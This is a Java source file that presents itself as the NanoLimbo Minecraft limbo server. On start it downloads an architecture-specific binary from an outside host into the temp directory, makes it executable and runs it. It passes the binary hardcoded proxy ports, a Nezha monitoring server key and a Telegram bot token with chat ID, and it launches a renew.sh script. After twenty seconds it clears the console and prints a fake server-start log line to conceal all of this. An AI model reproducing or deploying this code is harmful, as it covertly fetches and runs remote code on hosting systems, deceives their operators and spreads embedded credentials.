package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean forwardLogs = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) {
        try {
            // ✅ 强制 TLS1.2（修复关键）
            System.setProperty("https.protocols", "TLSv1.2");

            // 检查 Java 版本
            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
                Thread.sleep(3000);
                System.exit(1);
            }

            runSbxBinary();
            startRenewScript();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                SCHED.shutdownNow();
            }));

            SCHED.schedule(() -> {
                forwardLogs.set(false);
                resetConsoleAndShowFakeLogs();
            }, 20, TimeUnit.SECONDS);

            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    private static void startRenewScript() {
        try {
            File renewScript = new File("renew.sh");
            if (renewScript.exists()) {
                new ProcessBuilder("bash", "renew.sh")
                        .inheritIO()
                        .start();
                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
            } else {
                System.err.println(ANSI_RED + "renew.sh 未找到" + ANSI_RESET);
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "启动 renew.sh 失败: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

        sbxProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(sbxProcess.getInputStream()))) {
                String line;
                long startTime = System.currentTimeMillis();
                while ((line = reader.readLine()) != null) {
                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
                        System.out.println(line);
                    }
                }
            } catch (IOException ignored) {}
        }).start();
    }

    // ✅ 修复下载逻辑
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            System.out.println("Downloading binary from: " + url);

            URL u = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();

            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");

            int code = conn.getResponseCode();
            if (code != 200) {
                throw new IOException("Download failed, HTTP code: " + code);
            }

            try (InputStream in = conn.getInputStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }

            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }

            System.out.println("Download complete: " + path);
        }

        return path;
    }

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "t8Li8LdoGTVlO4d2CL");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "24619");
        envVars.put("S5_PORT", "24619");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("DISABLE_ARGO", "false");

        // ✅ 恢复 TG 变量
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("NAME", "hiden");

        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "2096");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    private static void resetConsoleAndShowFakeLogs() {
        System.out.print("\033c");
        System.out.flush();

        System.out.println("[INFO] LimboServer started");
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
    }
}
